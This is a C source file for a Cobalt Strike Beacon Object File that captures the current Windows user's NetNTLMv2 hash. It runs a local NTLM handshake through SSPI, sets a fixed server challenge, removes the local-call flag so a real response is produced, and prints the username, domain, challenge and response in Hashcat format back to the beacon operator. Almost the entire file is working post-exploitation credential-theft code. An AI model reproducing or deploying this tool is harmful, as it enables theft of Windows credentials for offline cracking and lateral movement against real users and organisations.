#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#define SECURITY_WIN32
#include <Security.h>
#include <Wincrypt.h>
#include "capturenetntlm.h"
#include "beacon.h"

#pragma comment(lib,"Secur32")

#define MSV1_0_CHALLENGE_LENGTH 8

//
//Most of the code originates from: https://github.com/leechristensen/GetNTLMChallenge/tree/master
//

typedef enum {
	NtLmNegotiate = 1,
	NtLmChallenge,
	NtLmAuthenticate,
	NtLmUnknown
} NTLM_MESSAGE_TYPE;

typedef struct _STRING32 {
	USHORT Length;
	USHORT MaximumLength;
	DWORD  Offset;
} STRING32, *PSTRING32;

// Valid values of NegotiateFlags
#define NTLMSSP_NEGOTIATE_UNICODE               0x00000001
#define NTLMSSP_NEGOTIATE_OEM                   0x00000002  
#define NTLMSSP_REQUEST_TARGET                  0x00000004  
#define NTLMSSP_NEGOTIATE_SIGN                  0x00000010  
#define NTLMSSP_NEGOTIATE_SEAL                  0x00000020  
#define NTLMSSP_NEGOTIATE_DATAGRAM              0x00000040  
#define NTLMSSP_NEGOTIATE_NTLM                  0x00000200  
#define NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED       0x1000 
#define NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED  0x2000  
#define NTLMSSP_NEGOTIATE_LOCAL_CALL            0x00004000  
#define NTLMSSP_NEGOTIATE_ALWAYS_SIGN           0x00008000  

// Valid target types returned by the server in Negotiate Flags
#define NTLMSSP_TARGET_TYPE_DOMAIN              0x00010000 
#define NTLMSSP_TARGET_TYPE_SERVER              0x00020000  
#define NTLMSSP_TARGET_TYPE_SHARE               0x00040000  
#define NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY   0x00080000  
#define NTLMSSP_NEGOTIATE_IDENTIFY              0x00100000  

// Valid requests for additional output buffers
#define NTLMSSP_REQUEST_ACCEPT_RESPONSE         0x00200000 
#define NTLMSSP_REQUEST_NON_NT_SESSION_KEY      0x00400000  
#define NTLMSSP_NEGOTIATE_TARGET_INFO           0x00800000 
#define NTLMSSP_NEGOTIATE_EXPORTED_CONTEXT      0x01000000 
#define NTLMSSP_NEGOTIATE_VERSION               0x02000000  
#define NTLMSSP_NEGOTIATE_128                   0x20000000 
#define NTLMSSP_NEGOTIATE_KEY_EXCH              0x40000000 
#define NTLMSSP_NEGOTIATE_56                    0x80000000

// flags used in client space to control sign and seal; never appear on the wire
#define NTLMSSP_APP_SEQ           0x0040  

#define MsvAvEOL                  0x0000
#define MsvAvNbComputerName       0x0001
#define MsvAvNbDomainName         0x0002
#define MsvAvNbDnsComputerName    0x0003
#define MsvAvNbDnsDomainName      0x0004
#define MsvAvNbDnsTreeName        0x0005
#define MsvAvFlags                0x0006
#define MsvAvTimestamp            0x0007
#define MsvAvRestrictions         0x0008
#define MsvAvTargetName           0x0009
#define MsvAvChannelBindings      0x000A


typedef struct _NTLM_VERSION {
	BYTE ProductMajorVersion;
	BYTE ProductMinorVersion;
	USHORT ProductBuild;
	BYTE reserved[3];
	BYTE NTLMRevisionCurrent;
} NTLM_VERSION, *PNTLM_VERSION;

typedef struct _NTLMv2_CLIENT_CHALLENGE {
	BYTE RespType;
	BYTE HiRespType;
	USHORT Reserved1;
	DWORD Reserved2;
	ULONGLONG TimeStamp;
	BYTE ChallengeFromClient[8];
	DWORD Reserved3;
	BYTE AvPair[4];
} NTLMv2_CLIENT_CHALLENGE, *PNTLMv2_CLIENT_CHALLENGE;

typedef struct _NTLMv2_RESPONSE {
	BYTE Response[16];
	NTLMv2_CLIENT_CHALLENGE Challenge;
} NTLMv2_RESPONSE, *PNTLMv2_RESPONSE;

typedef struct _NEGOTIATE_MESSAGE {
	UCHAR Signature[8];
	DWORD MessageType;
	DWORD NegotiateFlags;
	STRING32 OemDomainName;
	STRING32 OemWorkstationName;
} NEGOTIATE_MESSAGE, *PNEGOTIATE_MESSAGE;

typedef struct _NEGOTIATE_MESSAGE_WITH_VERSION {
	UCHAR Signature[8];
	DWORD MessageType;
	DWORD NegotiateFlags;
	STRING32 OemDomainName;
	STRING32 OemWorkstationName;
	NTLM_VERSION Version;
} NEGOTIATE_MESSAGE_WITH_VERSION, *PNEGOTIATE_MESSAGE_WITH_VERSION;

typedef struct _CHALLENGE_MESSAGE {
	UCHAR Signature[8];
	DWORD MessageType;
	STRING32 TargetName;
	DWORD NegotiateFlags;
	UCHAR Challenge[MSV1_0_CHALLENGE_LENGTH];
	ULONG64 ServerContextHandle;
	STRING32 TargetInfo;
} CHALLENGE_MESSAGE, *PCHALLENGE_MESSAGE;

typedef struct _CHALLENGE_MESSAGE_WITH_VERSION {
	UCHAR Signature[8];
	DWORD MessageType;
	STRING32 TargetName;
	DWORD NegotiateFlags;
	UCHAR Challenge[MSV1_0_CHALLENGE_LENGTH];
	ULONG64 ServerContextHandle;
	STRING32 TargetInfo;
	NTLM_VERSION Version;
} CHALLENGE_MESSAGE_WITH_VERSION, *PCHALLENGE_MESSAGE_WITH_VERSION;

typedef struct _AUTHENTICATE_MESSAGE {
	UCHAR Signature[8];
	DWORD MessageType;
	STRING32 LmChallengeResponse;
	STRING32 NtChallengeResponse;
	STRING32 DomainName;
	STRING32 UserName;
	STRING32 Workstation;
	STRING32 SessionKey;
	DWORD NegotiateFlags;
} AUTHENTICATE_MESSAGE, *PAUTHENTICATE_MESSAGE;

typedef struct _RESTRICTIONS_ENCODING {
	DWORD dwSize;
	DWORD dwReserved;
	DWORD dwIntegrityLevel;
	DWORD dwSubjectIntegrityLevel;
	BYTE MachineId[32];
} RESTRICTIONS_ENCODING, *PRESTRICTIONS_ENCODING;

typedef LONG NTSTATUS;
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _KEY_BLOB {
	BYTE   bType;
	BYTE   bVersion;
	WORD   reserved;
	ALG_ID aiKeyAlg;
	ULONG keysize;
	BYTE Data[16];
} KEY_BLOB;

NTSTATUS WINAPI SystemFunction007(PUNICODE_STRING string, LPBYTE hash);


//START beacon print function. Code originates from: https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/Psx/SOURCE/Psx.c
HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
	HRESULT hr = S_FALSE;
	va_list argList;
	DWORD dwWritten = 0;

	if (g_lpStream <= (LPSTREAM)1) {
		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &g_lpStream);
		if (FAILED(hr)) {
			return hr;
		}
	}

	if (g_lpwPrintBuffer <= (LPWSTR)1) { 
		g_lpwPrintBuffer = (LPWSTR)MSVCRT$calloc(MAX_STRING, sizeof(WCHAR));
		if (g_lpwPrintBuffer == NULL) {
			hr = E_FAIL;
			goto CleanUp;
		}
	}

	va_start(argList, lpwFormat);
	if (!MSVCRT$_vsnwprintf_s(g_lpwPrintBuffer, MAX_STRING, MAX_STRING -1, lpwFormat, argList)) {
		hr = E_FAIL;
		goto CleanUp;
	}

	if (g_lpStream != NULL) {
		if (FAILED(hr = g_lpStream->lpVtbl->Write(g_lpStream, g_lpwPrintBuffer, (ULONG)MSVCRT$wcslen(g_lpwPrintBuffer) * sizeof(WCHAR), &dwWritten))) {
			goto CleanUp;
		}
	}

	hr = S_OK;

CleanUp:

	if (g_lpwPrintBuffer != NULL) {
		MSVCRT$memset(g_lpwPrintBuffer, 0, MAX_STRING * sizeof(WCHAR)); 
	}

	va_end(argList);
	return hr;
}

VOID BeaconOutputStreamW() {
	STATSTG ssStreamData = { 0 };
	SIZE_T cbSize = 0;
	ULONG cbRead = 0;
	LARGE_INTEGER pos;
	LPWSTR lpwOutput = NULL;

	if (FAILED(g_lpStream->lpVtbl->Stat(g_lpStream, &ssStreamData, STATFLAG_NONAME))) {
		return;
	}

	cbSize = ssStreamData.cbSize.LowPart;
	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
	if (lpwOutput != NULL) {
		pos.QuadPart = 0;
		if (FAILED(g_lpStream->lpVtbl->Seek(g_lpStream, pos, STREAM_SEEK_SET, NULL))) {
			goto CleanUp;
		}

		if (FAILED(g_lpStream->lpVtbl->Read(g_lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
			goto CleanUp;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
	}

CleanUp:
	if (g_lpStream != NULL) {
		g_lpStream->lpVtbl->Release(g_lpStream);
		g_lpStream = NULL;
	}

	if (g_lpwPrintBuffer != NULL) {
		MSVCRT$free(g_lpwPrintBuffer); 
		g_lpwPrintBuffer = NULL;
	}

	if (lpwOutput != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
	}
	return;
}
//END beacon print function


void SetPredefinedChallenge(UCHAR challenge[MSV1_0_CHALLENGE_LENGTH]) {
    const UCHAR predefinedChallenge[] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};
    MSVCRT$memcpy(challenge, predefinedChallenge, MSV1_0_CHALLENGE_LENGTH);
}


BOOL GetNTLMChallengeAndResponse() {
	WCHAR szDomainName[256 + 1] = L"";
	WCHAR szUserName[256 + 1] = L"";
	wchar_t ntlmsp_name[] = L"NTLM";
	UCHAR bServerChallenge[MSV1_0_CHALLENGE_LENGTH];
	PNTLMv2_RESPONSE pNtChallengeResponse = NULL;
	PNTLMv2_CLIENT_CHALLENGE pClientChallenge = NULL;
	DWORD dwClientChallengeSize = 0;

	CredHandle hInboundCred;
	CredHandle hOutboundCred;
	TimeStamp InboundLifetime;
	TimeStamp OutboundLifetime;

	DWORD status = SECUR32$AcquireCredentialsHandleW(NULL, ntlmsp_name, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hOutboundCred, &OutboundLifetime);

	if (status != 0)
		return FALSE;

	status = SECUR32$AcquireCredentialsHandleW(NULL, ntlmsp_name, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hInboundCred, &InboundLifetime);

	if (status != 0)
		return FALSE;

	SecBufferDesc OutboundNegotiateBuffDesc;
	SecBuffer NegotiateSecBuff;
	OutboundNegotiateBuffDesc.ulVersion = 0;
	OutboundNegotiateBuffDesc.cBuffers = 1;
	OutboundNegotiateBuffDesc.pBuffers = &NegotiateSecBuff;

	NegotiateSecBuff.cbBuffer = 0;
	NegotiateSecBuff.BufferType = SECBUFFER_TOKEN;
	NegotiateSecBuff.pvBuffer = NULL;

	SecBufferDesc OutboundChallengeBuffDesc;
	SecBuffer ChallengeSecBuff;
	OutboundChallengeBuffDesc.ulVersion = 0;
	OutboundChallengeBuffDesc.cBuffers = 1;
	OutboundChallengeBuffDesc.pBuffers = &ChallengeSecBuff;

	ChallengeSecBuff.cbBuffer = 0;
	ChallengeSecBuff.BufferType = SECBUFFER_TOKEN;
	ChallengeSecBuff.pvBuffer = NULL;

	SecBufferDesc OutboundAuthenticateBuffDesc;
	SecBuffer AuthenticateSecBuff;
	OutboundAuthenticateBuffDesc.ulVersion = 0;
	OutboundAuthenticateBuffDesc.cBuffers = 1;
	OutboundAuthenticateBuffDesc.pBuffers = &AuthenticateSecBuff;

	AuthenticateSecBuff.cbBuffer = 0;
	AuthenticateSecBuff.BufferType = SECBUFFER_TOKEN;
	AuthenticateSecBuff.pvBuffer = NULL;

	CtxtHandle OutboundContextHandle = { 0 };
	ULONG OutboundContextAttributes = 0;
	CtxtHandle ClientContextHandle = { 0 };
	ULONG InboundContextAttributes = 0;

	// Setup the client security context
	status = SECUR32$InitializeSecurityContextW(&hOutboundCred, NULL, NULL, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, 0, SECURITY_NATIVE_DREP, NULL, 0, &OutboundContextHandle, &OutboundNegotiateBuffDesc, &OutboundContextAttributes, &OutboundLifetime);
	if (status != SEC_I_CONTINUE_NEEDED) return FALSE;

	NEGOTIATE_MESSAGE* negotiate = (NEGOTIATE_MESSAGE*)OutboundNegotiateBuffDesc.pBuffers[0].pvBuffer;

	status = SECUR32$AcceptSecurityContext(&hInboundCred, NULL, &OutboundNegotiateBuffDesc, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, SECURITY_NATIVE_DREP, &ClientContextHandle, &OutboundChallengeBuffDesc, &InboundContextAttributes, &InboundLifetime);
	if (status != SEC_I_CONTINUE_NEEDED) return FALSE;

	// client
	CHALLENGE_MESSAGE* challenge = (CHALLENGE_MESSAGE*)OutboundChallengeBuffDesc.pBuffers[0].pvBuffer;
	
	// Set the predefined challenge instead of the random one
	SetPredefinedChallenge(challenge->Challenge);

	// when local call, windows remove the ntlm response
	challenge->NegotiateFlags &= ~NTLMSSP_NEGOTIATE_LOCAL_CALL;

	status = SECUR32$InitializeSecurityContextW(&hOutboundCred, &OutboundContextHandle, NULL, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE, 0, SECURITY_NATIVE_DREP, &OutboundChallengeBuffDesc, 0, &OutboundContextHandle, &OutboundAuthenticateBuffDesc, &OutboundContextAttributes, &OutboundLifetime);
	if (status != 0) return FALSE;

	AUTHENTICATE_MESSAGE* authenticate = (AUTHENTICATE_MESSAGE*)OutboundAuthenticateBuffDesc.pBuffers[0].pvBuffer;

	// Get domain name
	MSVCRT$memcpy(szDomainName, ((PBYTE)authenticate + authenticate->DomainName.Offset), authenticate->DomainName.Length);
	szDomainName[authenticate->DomainName.Length / 2] = 0;

	// Get username
	MSVCRT$memcpy(szUserName, ((PBYTE)authenticate + authenticate->UserName.Offset), authenticate->UserName.Length);
	szUserName[authenticate->UserName.Length / 2] = 0;

	// Get the Server challenge
	MSVCRT$memcpy(bServerChallenge, challenge->Challenge, MSV1_0_CHALLENGE_LENGTH);

	// Get the Challenge response
	pNtChallengeResponse = (PNTLMv2_RESPONSE)((ULONG_PTR)authenticate + authenticate->NtChallengeResponse.Offset);

	pClientChallenge = &(pNtChallengeResponse->Challenge);
	dwClientChallengeSize = authenticate->NtChallengeResponse.Length - 16;

	// Print output in Hashcat Format: username:domain:ServerChallenge:response:blob
	BeaconPrintToStreamW(L"[+] Successful NetNTLMv2 hash capture:\n");
	BeaconPrintToStreamW(L"========================================\n\n");
	BeaconPrintToStreamW(L"%s::%s:", szUserName, szDomainName);

	// ServerChallenge
	for (int i = 0; i < sizeof(bServerChallenge); i++) {
		BeaconPrintToStreamW(L"%02x", bServerChallenge[i]);
	}
	BeaconPrintToStreamW(L":");

	// response
	for (int i = 0; i < sizeof(pNtChallengeResponse->Response); i++) {
		BeaconPrintToStreamW(L"%02x", pNtChallengeResponse->Response[i]);
	}
	BeaconPrintToStreamW(L":");

	// blob
	for (DWORD i = 0; i < dwClientChallengeSize; i++) {
		BeaconPrintToStreamW(L"%02x", *((PBYTE)(&(pNtChallengeResponse->Challenge)) + i));  // 16 
	}
	BeaconPrintToStreamW(L"\n");

	return TRUE;
}


int go() {
	BOOL result = GetNTLMChallengeAndResponse();
	
	if (result) {
		BeaconOutputStreamW();
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,"\n[-] Failed to capture NetNTLM hash.\n");
    }
	
	return 0;
}